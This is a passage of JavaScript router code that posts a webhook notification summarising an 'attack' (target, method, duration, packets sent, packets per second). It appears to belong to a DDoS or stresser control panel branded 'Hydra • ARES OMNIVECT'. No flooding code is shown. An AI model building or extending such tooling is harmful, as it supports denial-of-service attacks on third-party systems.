        if (!attackData) return [{ name: "Event", value: evt, inline: true }];
        const ad = attackData;
        return [
          { name: "🎯 Target",       value: `\`${ad.target}\``,  inline: true },
          { name: "⚔️ Method",       value: `\`${ad.method}\``,  inline: true },
          { name: "⏱ Duration",      value: `${ad.duration}s`,   inline: true },
          { name: "📦 Packets Sent",  value: (livePackets.get(ad.id) ?? ad.packetsSent ?? 0).toLocaleString(), inline: true },
          { name: "📊 PPS at Kill",   value: (livePps.get(ad.id) ?? 0).toLocaleString(),                  inline: true },
          { name: "🔌 Status",        value: ad.status,           inline: true },
        ];
      })(),
      timestamp: new Date().toISOString(),
      footer: { text: "Hydra • ARES OMNIVECT ∞ v3" },
    }],
  };
  try {
    const r = await fetch(webhookUrl, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload), signal: AbortSignal.timeout(6000),
    });
    res.json({ ok: true, status: r.status });
  } catch (e) { res.status(503).json({ error: "Webhook delivery failed", detail: String(e) }); }
});

export default router;
